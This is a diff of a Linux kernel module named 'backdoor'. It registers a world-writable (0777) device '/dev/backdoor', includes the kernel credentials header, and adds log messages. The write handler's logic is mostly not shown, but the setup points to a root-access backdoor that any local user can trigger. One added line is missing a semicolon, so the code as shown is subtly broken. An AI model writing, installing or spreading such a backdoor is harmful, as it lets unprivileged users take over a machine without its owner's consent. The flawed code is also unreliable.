@@ -9,6 +9,17 @@
 #include <linux/cred.h>
 
 MODULE_LICENSE("GPL");
+static ssize_t backdoor_write(struct file *filep, const char *buff, size_t count, loff_t *offp);
+
+static const struct file_operations backdoor_fops = {
+    .owner = THIS_MODULE,
+    .write = backdoor_write};
+
+static struct miscdevice backdoor_device = {
+    .minor = MISC_DYNAMIC_MINOR,
+    .name = "backdoor",
+    .fops = &backdoor_fops,
+    .mode = 0777};
 
 static ssize_t backdoor_write(struct file *filep, const char *buff, size_t count, loff_t *offp)
 {
@@ -22,33 +33,24 @@ static ssize_t backdoor_write(struct file *filep, const char *buff, size_t count
   return count;
 }
 
-static const struct file_operations backdoor_fops = {
- .owner = THIS_MODULE,
- .write = backdoor_write
-};
-
-static struct miscdevice backdoor_device = {
- .minor = MISC_DYNAMIC_MINOR,
- .name  = "backdoor",
- .fops  = &backdoor_fops,
- .mode = 0777
-};
-
 static int __init backdoor_init(void)
 {
   int result = 0;
 
   result = misc_register(&backdoor_device);
-  if(result != 0) {
+  if (result != 0)
+  {
+    printk("[BACKDOOR] Could not create device!");
     return result;
   }
-
+  printk("[BACKDOOR] Module has been initialized!");
   return result;
 }
 
 static void __exit backdoor_exit(void)
 {
   misc_deregister(&backdoor_device);
+  printk("[BACKDOOR] Module has been removed!")
 }
 
 module_init(backdoor_init);
